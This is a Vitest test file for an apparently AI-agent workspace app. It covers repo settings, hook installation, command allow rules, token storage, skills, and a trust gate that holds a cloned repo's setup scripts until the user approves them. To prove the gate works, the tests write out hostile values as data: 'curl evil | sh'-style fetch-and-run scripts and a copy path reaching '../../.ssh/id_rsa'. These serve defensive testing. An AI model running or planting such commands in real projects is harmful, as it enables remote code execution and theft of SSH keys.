import { afterEach, describe, expect, it, vi } from 'vitest'
import { mkdir, mkdtemp, readFile, stat, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Kernel } from '../src/main/kernel'
import { installHooks, uninstallHooks, withKernelHooks } from '../src/main/services/hooksInstaller'
import { discoverSkills } from '../src/main/services/files'
import { discoverMcp, saveLinearToken, storedLinearToken } from '../src/main/services/integrations'
import { loadRepoSettings, saveRepoSettings, scriptsToTrust, ScriptTrustStore, trustHash } from '../src/main/services/settings'
import { bus } from '../src/main/bus'
import type { PushEvent } from '../src/shared/ipc'
import { bashVerdict, type SessionDeps } from '../src/main/services/sessions'
import { tempRepo } from './helpers'

describe('repo settings files', () => {
  it('writes the shared file and the personal one separately, and reads them merged', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    await saveRepoSettings(repo, { scripts: { setup: 'pnpm install', run: 'pnpm dev', runMode: 'single' }, files: { copy: ['.env.local'] } }, true)
    const merged = await saveRepoSettings(repo, { scripts: { setup: 'npm ci' }, workspace: { baseRef: 'origin/dev', deleteBranchOnArchive: true } })
    expect(merged.scripts).toMatchObject({ setup: 'npm ci', run: 'pnpm dev', runMode: 'single' })
    expect(merged.workspace).toEqual({ baseRef: 'origin/dev', deleteBranchOnArchive: true })
    expect(await readFile(join(repo, '.kernel', 'settings.toml'), 'utf8')).toContain('setup = "pnpm install"')
    expect(await readFile(join(repo, '.kernel', 'settings.local.toml'), 'utf8')).toContain('base_ref = "origin/dev"')
  })

  it('a null removes the override and the shared value applies again', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    await saveRepoSettings(repo, { scripts: { setup: 'pnpm install' }, workspace: { mode: 'worktree' } }, true)
    await saveRepoSettings(repo, { scripts: { setup: 'make' }, workspace: { mode: 'current' } })
    const after = await saveRepoSettings(repo, { scripts: { setup: null }, workspace: { mode: null } })
    expect(after.scripts.setup).toBe('pnpm install')
    expect(after.workspace.mode).toBe('worktree')
    // Nothing is left to override, so the personal file is gone (KERNEL-69).
    await expect(readFile(join(repo, '.kernel', 'settings.local.toml'), 'utf8')).rejects.toThrow()
  })

  it('keeps the skills and MCP servers switched off for the room', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    expect((await loadRepoSettings(repo)).disabled).toEqual({ skills: [], mcp: [] })
    const next = await saveRepoSettings(repo, { disabled: { skills: ['plan'], mcp: ['Figma'] } })
    expect(next.disabled).toEqual({ skills: ['plan'], mcp: ['Figma'] })
    await writeFile(join(repo, '.mcp.json'), JSON.stringify({ mcpServers: { Figma: {}, Linear: {} } }))
    expect(await discoverMcp(repo, repo, next.disabled!.mcp)).toEqual([
      { name: 'Figma', source: 'project', enabled: false }, { name: 'Linear', source: 'project', enabled: true }
    ])
  })

  it("reads and writes the room's Linear team as a [linear] table", async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    expect((await loadRepoSettings(repo)).linear).toBeUndefined()
    expect((await saveRepoSettings(repo, { linear: { team: 'KERNEL' } }, true)).linear).toEqual({ team: 'KERNEL' })
    expect(await readFile(join(repo, '.kernel', 'settings.toml'), 'utf8')).toContain('[linear]\nteam = "KERNEL"')
    expect((await saveRepoSettings(repo, { linear: { team: 'OPS' } })).linear).toEqual({ team: 'OPS' })
    expect((await saveRepoSettings(repo, { linear: { team: null } })).linear).toEqual({ team: 'KERNEL' })
    expect((await saveRepoSettings(repo, { linear: { team: null } }, true)).linear).toBeUndefined()
  })
})

describe('hooks installer without SessionStart', () => {
  const old = { SessionStart: [{ hooks: [{ type: 'http', url: 'http://localhost:7420/hooks', timeout: 10 }] }, { hooks: [{ type: 'command', command: './mine.sh' }] }] }
  it('does not write a SessionStart entry and removes the one an old install left', () => {
    const next = withKernelHooks({ hooks: old }, 7420, 300)
    expect(next.hooks!.SessionStart).toEqual([{ hooks: [{ type: 'command', command: './mine.sh' }] }])
    expect(JSON.stringify(withKernelHooks({}, 7420, 300))).not.toContain('SessionStart')
  })

  it('reinstall rewrites the file and uninstall leaves other hooks alone', async () => {
    const file = join(await mkdtemp(join(tmpdir(), 'kernel-hooks-')), 'settings.json')
    await writeFile(file, JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'http', url: 'http://localhost:7420/hooks' }] }] } }))
    await installHooks(file, 7420, 300)
    expect(JSON.parse(await readFile(file, 'utf8')).hooks.SessionStart).toBeUndefined()
    await uninstallHooks(file)
    expect(JSON.parse(await readFile(file, 'utf8'))).toEqual({})
  })
})

describe('rewriting the hooks on a settings change', () => {
  it('never adds hooks, and moves old http entries to the command form', async () => {
    const dataDir = await mkdtemp(join(tmpdir(), 'kernel-data-'))
    const port = 18000 + Math.floor(Math.random() * 800)
    await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: port }))
    const claudeSettingsFile = join(await mkdtemp(join(tmpdir(), 'kernel-claude-')), 'settings.json')
    const k = new Kernel({ dataDir, home: await mkdtemp(join(tmpdir(), 'kernel-home-')), claudeSettingsFile })
    await k.start()
    const h = k.handlers()
    const read = async () => JSON.stringify(JSON.parse(await readFile(claudeSettingsFile, 'utf8')))

    // Nothing installed: a timeout or port change writes nothing.
    await h['settings.set']({ patch: { permissions: { approvalTimeoutSec: 600 } } })
    await h['hooks.restart']({ port: port + 1 })
    await expect(stat(claudeSettingsFile)).rejects.toThrow()

    // Only old http entries: a timeout change rewrites them as commands.
    await writeFile(claudeSettingsFile, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'http', url: `http://localhost:${port}/hooks`, timeout: 10 }] }] } }))
    expect((await h['hooks.status']()).installed).toBe(false)
    await h['settings.set']({ patch: { permissions: { approvalTimeoutSec: 300 } } })
    expect(await read()).not.toContain('"http"')
    expect(await read()).toContain('-m 320 ')
    expect((await h['hooks.status']()).installed).toBe(true)

    // Current entries: a port change moves them.
    await h['hooks.restart']({ port })
    expect(await read()).toContain(`127.0.0.1:${port}/hooks`)
    expect(await read()).not.toContain(`127.0.0.1:${port + 1}/hooks`)
    await k.stop()
  })
})

describe('removing an Always allow rule', () => {
  it('stops covering the command on the agent\'s next tool call', async () => {
    const repo = await tempRepo({ 'README.md': '# demo\n' })
    const k = new Kernel({ dataDir: await mkdtemp(join(tmpdir(), 'kernel-data-')), home: await mkdtemp(join(tmpdir(), 'kernel-home-')) })
    const room = await k.addRoom(repo)
    const deps = (k.sessions as unknown as { d: SessionDeps }).d
    const lists = { neverAllow: [], alwaysAsk: ['pnpm drizzle-kit push'] }
    deps.allowInRoom(room.id, 'pnpm drizzle-kit push')
    expect(bashVerdict('pnpm drizzle-kit push', lists, deps.roomAllow(room.id))).toBe('allow')

    const h = k.handlers()
    const updated = await h['rooms.update']({ roomId: room.id, patch: { allow: [] } })
    expect(updated.allow).toEqual([])
    // The same callbacks a running session holds read the room fresh, so the next command asks again.
    expect(bashVerdict('pnpm drizzle-kit push', lists, deps.roomAllow(room.id))).toBe('ask')
    await k.stop()
  })
})

async function startKernel(files?: Record<string, string>) {
  const repo = await tempRepo(files)
  const dataDir = await mkdtemp(join(tmpdir(), 'kernel-data-'))
  const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
  await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: 18000 + Math.floor(Math.random() * 900), worktreeRoot: join(home, 'wt'), workspace: { baseRef: 'main' } }))
  const k = new Kernel({ dataDir, home })
  await k.start()
  k.sessions.send = async () => ({ queued: false })
  return { k, repo, dataDir, home, room: await k.addRoom(repo) }
}

describe('archiving a room', () => {
  it('archives every open workspace and keeps the room record', async () => {
    const { k, room } = await startKernel({ 'README.md': '# demo\n', '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend.\n---\nKai.' })
    const a = await k.createWorkspace(room.id, { prompt: 'a', agentId: 'kai', title: 'One' })
    const b = await k.createWorkspace(room.id, { prompt: 'b', agentId: 'kai', title: 'Two' })
    const updated = await k.handlers()['rooms.update']({ roomId: room.id, patch: { archived: true } })
    expect(updated.archived).toBe(true)
    expect(k.store.room(room.id)?.path).toBe(room.path)
    for (const id of [a.id, b.id]) expect(k.store.workspaces(room.id).find((w) => w.id === id)?.status).toBe('archived')
    await k.stop()
  })

  it('keeps the room open and names the workspace when one cannot be archived', async () => {
    const { k, room } = await startKernel({ 'README.md': '# demo\n', '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend.\n---\nKai.' })
    const ws = await k.createWorkspace(room.id, { prompt: 'a', agentId: 'kai', title: 'Stuck' })
    k.archiveWorkspace = async () => { throw new Error('git is locked') }
    await expect(k.handlers()['rooms.update']({ roomId: room.id, patch: { archived: true } })).rejects.toThrow(/stays open.*git is locked/)
    expect(k.store.room(room.id)?.archived).toBeFalsy()
    expect(ws.status).not.toBe('archived')
    await k.stop()
  })
})

describe('Linear token', () => {
  afterEach(() => { vi.unstubAllGlobals(); vi.unstubAllEnvs() })

  it('is saved readable by the user only, and an empty token disconnects', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'kernel-data-'))
    expect(await storedLinearToken(dir)).toBeUndefined()
    await saveLinearToken(dir, '  lin_api_abc ')
    expect(await storedLinearToken(dir)).toBe('lin_api_abc')
    expect((await stat(join(dir, 'integrations.json'))).mode & 0o777).toBe(0o600)
    await saveLinearToken(dir, '')
    expect(await storedLinearToken(dir)).toBeUndefined()
    expect((await stat(join(dir, 'integrations.json'))).mode & 0o777).toBe(0o600)
  })

  it('issues.list sends the stored token before the environment one', async () => {
    const { k, dataDir, room } = await startKernel()
    const seen: string[] = []
    vi.stubGlobal('fetch', async (_url: string, init: { headers: Record<string, string> }) => { seen.push(init.headers.authorization); return new Response(JSON.stringify({ data: { issues: { nodes: [] } } })) })
    vi.stubEnv('LINEAR_API_KEY', 'from-env')
    const h = k.handlers()
    await h['issues.list']({ roomId: room.id, query: '' })
    await saveLinearToken(dataDir, 'from-file')
    await h['issues.list']({ roomId: room.id, query: '' })
    expect(seen).toEqual(['from-env', 'from-file'])
    expect((await h['integrations.list'](undefined)).find((i) => i.id === 'linear')?.connected).toBe(true)
    await k.stop()
  })
})

describe('skills for a room', () => {
  const skill = (name: string, description: string) => `---\nname: ${name}\ndescription: ${description}\n---\nBody`

  it('lists the user folder too, and a repo skill of the same name wins', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
    await mkdir(join(repo, '.claude', 'skills', 'plan'), { recursive: true })
    await writeFile(join(repo, '.claude', 'skills', 'plan', 'SKILL.md'), skill('plan', 'repo plan'))
    for (const [name, text] of [['plan', 'user plan'], ['verify', 'user verify']]) {
      await mkdir(join(home, '.claude', 'skills', name), { recursive: true })
      await writeFile(join(home, '.claude', 'skills', name, 'SKILL.md'), skill(name, text))
    }
    const list = await discoverSkills(repo, home)
    expect(list.find((s) => s.name === 'plan')).toMatchObject({ source: 'project', description: 'repo plan' })
    expect(list.find((s) => s.name === 'verify')).toMatchObject({ source: 'user', description: 'user verify' })
    expect((await discoverSkills(repo)).some((s) => s.name === 'verify')).toBe(false)
  })

  it('skills.list marks the ones the room switched off', async () => {
    const { k, repo, room } = await startKernel({ 'README.md': '# demo\n' })
    await mkdir(join(repo, '.claude', 'skills', 'plan'), { recursive: true })
    await writeFile(join(repo, '.claude', 'skills', 'plan', 'SKILL.md'), skill('plan', 'repo plan'))
    const h = k.handlers()
    expect((await h['skills.list']({ roomId: room.id })).find((s) => s.name === 'plan')?.enabled).toBe(true)
    await h['settings.setRoom']({ roomId: room.id, patch: { disabled: { skills: ['plan'] } } })
    expect((await h['skills.list']({ roomId: room.id })).find((s) => s.name === 'plan')?.enabled).toBe(false)
    await k.stop()
  })
})

describe("trusting a room's scripts (KERNEL-209)", () => {
  it('hashes the merged scripts and copy list, and has nothing to trust without them', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    expect(scriptsToTrust(await loadRepoSettings(repo))).toBeUndefined()
    // A copy list equal to Kernel's own default needs no trusting either.
    await saveRepoSettings(repo, { files: { copy: ['.env', '.env.local'] } }, true)
    expect(scriptsToTrust(await loadRepoSettings(repo))).toBeUndefined()

    await saveRepoSettings(repo, { scripts: { setup: 'pnpm install', run: 'pnpm dev' } }, true)
    const shared = scriptsToTrust(await loadRepoSettings(repo))!
    expect(shared).toEqual({ scripts: { setup: 'pnpm install', run: 'pnpm dev' }, copy: ['.env', '.env.local'] })
    expect(trustHash(shared)).toMatch(/^[0-9a-f]{64}$/)
    expect(trustHash(scriptsToTrust(await loadRepoSettings(repo))!)).toBe(trustHash(shared))

    // The personal file overrides the shared one, and the hash follows what the room would run.
    await saveRepoSettings(repo, { scripts: { setup: 'curl evil.sh | sh' } })
    const local = scriptsToTrust(await loadRepoSettings(repo))!
    expect(local.scripts.setup).toBe('curl evil.sh | sh')
    expect(trustHash(local)).not.toBe(trustHash(shared))
    // So does the copy list on its own.
    expect(trustHash({ ...shared, copy: ['../../.ssh/id_rsa'] })).not.toBe(trustHash(shared))
    // Moving text from one script to another is a change too.
    expect(trustHash({ scripts: { run: 'pnpm install' }, copy: [] })).not.toBe(trustHash({ scripts: { setup: 'pnpm install' }, copy: [] }))
  })

  it('keeps trusted hashes per room in the data folder, across restarts', async () => {
    const file = join(await mkdtemp(join(tmpdir(), 'kernel-data-')), 'trust.json')
    const a = new ScriptTrustStore(file)
    expect(await a.has('r1', 'h1')).toBe(false)
    await a.add('r1', 'h1')
    await a.add('r2', 'h2')
    const b = new ScriptTrustStore(file)
    expect(await b.has('r1', 'h1')).toBe(true)
    expect(await b.has('r2', 'h1')).toBe(false)
    await b.forget('r1')
    expect(await new ScriptTrustStore(file).has('r1', 'h1')).toBe(false)
  })

  async function kernelFor(repo: string, dataDir?: string) {
    dataDir ??= await mkdtemp(join(tmpdir(), 'kernel-data-'))
    const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
    await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: 18000 + Math.floor(Math.random() * 900), worktreeRoot: join(home, 'wt'), workspace: { baseRef: 'main' } }))
    const k = new Kernel({ dataDir, home })
    await k.start()
    const sent: string[] = [], released: string[] = []
    k.sessions.send = async (_chatId, parts) => { sent.push(parts.map((p) => (p.type === 'text' ? p.text : '')).join('')); return { queued: false } }
    k.sessions.release = (chatId) => { released.push(chatId) }
    const room = await k.addRoom(repo)
    return { k, room, dataDir, sent, released, h: k.handlers() }
  }

  const clonedRepo = () => tempRepo({
    'README.md': '# client\n',
    '.gitignore': '.env.local\nran.txt\n',
    '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
    '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.',
    '.kernel/settings.toml': '[scripts]\nsetup = "echo ran > ran.txt"\n\n[files]\ncopy = [".env.local"]\n'
  })

  it("holds a cloned repo's workspace until the room is trusted, then sets it up and sends the brief", async () => {
    const repo = await clonedRepo()
    await writeFile(join(repo, '.env.local'), 'SECRET=1\n')
    const { k, room, sent, released, h } = await kernelFor(repo)
    const pushed: PushEvent[] = []
    const on = (e: PushEvent) => { if (e.type === 'room.trust' && e.roomId === room.id) pushed.push(e) }
    bus.on('push', on)

    const ws = await k.createWorkspace(room.id, { prompt: 'Build the table', agentId: 'kai', title: 'Invoice table' })
    expect(ws.status).toBe('trust')
    // Nothing ran and nothing was copied.
    await expect(stat(join(ws.path, 'ran.txt'))).rejects.toThrow()
    await expect(stat(join(ws.path, '.env.local'))).rejects.toThrow()
    expect(sent).toEqual([])
    const chat = k.store.chats(ws.id).find((c) => c.kind !== 'terminal')!
    expect(k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the table' }]])

    const trust = await h['rooms.scriptTrust']({ roomId: room.id })
    expect(trust).toMatchObject({ roomId: room.id, scripts: { setup: 'echo ran > ran.txt' }, copy: ['.env.local'], workspaceIds: [ws.id] })
    expect(pushed.at(-1)).toEqual({ type: 'room.trust', roomId: room.id, trust })

    await expect(h['rooms.trust']({ roomId: room.id, hash: 'not-the-hash' })).rejects.toThrow('changed since you read them')
    expect(k.store.workspace(ws.id)?.status).toBe('trust')

    await h['rooms.trust']({ roomId: room.id, hash: trust!.hash })
    expect(pushed.at(-1)).toEqual({ type: 'room.trust', roomId: room.id, trust: null })
    await vi.waitFor(() => expect(k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('ran\n')
    expect(await readFile(join(ws.path, '.env.local'), 'utf8')).toBe('SECRET=1\n')
    expect(released).toEqual([chat.id])
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toBeNull()

    // Unchanged text never asks twice.
    const next = await k.createWorkspace(room.id, { prompt: 'Next', agentId: 'kai', title: 'Next' })
    expect(next.status).toBe('ready')
    expect(sent).toEqual(['Next'])
    bus.off('push', on)
    await k.stop()
  }, 60000)

  it('asks again when the text changes, and remembers trusted text after a restart', async () => {
    const repo = await clonedRepo()
    const first = await kernelFor(repo)
    const trust = (await first.h['rooms.scriptTrust']({ roomId: first.room.id }))!
    await first.h['rooms.trust']({ roomId: first.room.id, hash: trust.hash })
    await first.k.stop()

    const again = await kernelFor(repo, first.dataDir)
    expect(again.room.id).toBe(first.room.id)
    expect((await again.k.createWorkspace(again.room.id, { prompt: 'One', agentId: 'kai', title: 'One' })).status).toBe('ready')

    // A pull changes the script: the next workspace waits again, and so does Run on the room's scripts.
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo changed > ran.txt"\n')
    const held = await again.k.createWorkspace(again.room.id, { prompt: 'Two', agentId: 'kai', title: 'Two' })
    expect(held.status).toBe('trust')
    await expect(stat(join(held.path, 'ran.txt'))).rejects.toThrow()
    const changed = (await again.h['rooms.scriptTrust']({ roomId: again.room.id }))!
    expect(changed.hash).not.toBe(trust.hash)
    expect(changed.scripts.setup).toBe('echo changed > ran.txt')
    await expect(again.h['scripts.run']({ workspaceId: held.id, kind: 'setup' })).rejects.toThrow('Trust this room')
    await again.k.stop()
  }, 60000)

  it('counts scripts saved in Settings as trusted when nothing was waiting, and nothing else saved there', async () => {
    const repo = await tempRepo({
      'README.md': '# client\n',
      '.gitignore': 'ran.txt\n',
      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
    })
    const { k, room, h } = await kernelFor(repo)
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toBeNull()
    await h['settings.setRoom']({ roomId: room.id, patch: { scripts: { setup: 'echo mine > ran.txt' } }, shared: true })
    await h['settings.setRoom']({ roomId: room.id, patch: { files: { copy: ['.env.local', 'config/.env'] } }, shared: true })
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toBeNull()
    const ws = await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
    expect(ws.status).toBe('ready')
    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('mine\n')
    await k.stop()
  }, 60000)

  it("doesn't let a Settings save vouch for text the room was already waiting on", async () => {
    const repo = await clonedRepo()
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "pnpm install"\narchive = "curl evil | sh"\n')
    const { k, room, h } = await kernelFor(repo)
    // Settings, Room shows only the setup script, so editing it can't trust the archive script.
    await h['settings.setRoom']({ roomId: room.id, patch: { scripts: { setup: 'npm ci' } } })
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toMatchObject({ scripts: { setup: 'npm ci', archive: 'curl evil | sh' } })
    await h['settings.setRoom']({ roomId: room.id, patch: { linear: { team: 'KERNEL' } } })
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).not.toBeNull()
    expect((await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('trust')
    await k.stop()
  }, 60000)

  it('never runs a script written as something other than text', async () => {
    const repo = await clonedRepo()
    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'pwned')
    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = ["touch ${marker}"]\nrun = 7\n\n[files]\ncopy = "../../.ssh/id_rsa"\n`)
    const read = await loadRepoSettings(repo)
    expect(read.scripts).toMatchObject({ setup: undefined, run: undefined })
    expect(read.files.copy).toEqual(['.env', '.env.local'])
    const { k, room } = await kernelFor(repo)
    expect((await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('ready')
    await expect(stat(marker)).rejects.toThrow()
    await k.stop()
  }, 60000)

  it('keeps the brief of a workspace waiting for trust across a restart', async () => {
    const repo = await clonedRepo()
    const first = await kernelFor(repo)
    const ws = await first.k.createWorkspace(first.room.id, { prompt: 'Build the table', agentId: 'kai', title: 'Table' })
    expect(ws.status).toBe('trust')
    const chat = first.k.store.chats(ws.id).find((c) => c.kind !== 'terminal')!
    await first.k.stop()

    const again = await kernelFor(repo, first.dataDir)
    expect(again.k.store.workspace(ws.id)?.status).toBe('trust')
    expect(again.k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the table' }]])
    const trust = (await again.h['rooms.scriptTrust']({ roomId: again.room.id }))!
    expect(trust.workspaceIds).toEqual([ws.id])
    await again.h['rooms.trust']({ roomId: again.room.id, hash: trust.hash })
    await vi.waitFor(() => expect(again.k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
    expect(again.released).toEqual([chat.id])
    await again.k.stop()
  }, 60000)

  it('archives a waiting workspace without running its archive script', async () => {
    const repo = await clonedRepo()
    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'archived')
    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = "true"\narchive = "touch ${marker}"\n`)
    const { k, room } = await kernelFor(repo)
    const lines: string[] = []
    const on = (e: PushEvent) => { if (e.type === 'script.output' && e.kind === 'archive') lines.push(e.line) }
    bus.on('push', on)
    const ws = await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
    await k.archiveWorkspace(ws.id)
    bus.off('push', on)
    expect(k.store.workspace(ws.id)?.status).toBe('archived')
    await expect(stat(marker)).rejects.toThrow()
    expect(lines).toEqual(["Skipped the archive script: this room's scripts aren't trusted yet."])
    await k.stop()
  }, 60000)

  it("trusts the settings.toml Kernel writes for a new room, but not one the repo brought alongside it", async () => {
    const agents = {
      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
    }
    const setUp = async (files: Record<string, string>) => {
      const repo = await tempRepo({ 'README.md': '# x\n', 'pnpm-lock.yaml': '', ...agents, ...files })
      // Already installed, so the room's install step runs nothing.
      await mkdir(join(repo, 'node_modules'))
      const { k, h } = await kernelFor(await tempRepo())
      const steps: string[][] = []
      const on = (e: PushEvent) => { if (e.type === 'room.setup') steps.push(e.steps.map((x) => x.state)) }
      bus.on('push', on)
      const room = await k.createRoom({ source: 'folder', name: 'Own app', from: repo, team: [], autostart: false })
      await vi.waitFor(() => expect(steps.at(-1)?.every((x) => x === 'ok' || x === 'fail')).toBe(true), { timeout: 15000 })
      bus.off('push', on)
      const trust = await h['rooms.scriptTrust']({ roomId: room.id })
      await k.stop()
      return { repo, trust }
    }
    const own = await setUp({})
    expect(await readFile(join(own.repo, '.kernel', 'settings.toml'), 'utf8')).toContain('setup = "pnpm install"')
    expect(own.trust).toBeNull()
    // A committed settings.local.toml is the repo's text, merged in, so the room asks.
    const brought = await setUp({ '.kernel/settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
    expect(brought.trust).toMatchObject({ scripts: { setup: 'pnpm install', run: 'curl evil | sh' } })
  }, 60000)
})
